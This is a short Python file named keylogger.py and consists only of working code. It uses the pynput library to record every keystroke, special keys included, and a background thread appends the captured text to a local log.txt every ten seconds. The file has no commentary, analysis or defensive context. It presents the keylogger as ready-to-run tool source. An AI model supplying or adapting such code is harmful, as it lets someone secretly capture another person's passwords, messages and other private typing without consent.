# keylogger.py
import pynput.keyboard
import threading
import time

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{str(key)}] "

def write_log():
    global log
    while True:
        time.sleep(10)
        if log:
            with open("log.txt", "a") as file:
                file.write(log + "\n")
            log = ""

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()

thread = threading.Thread(target=write_log)
thread.start()

listener.join()
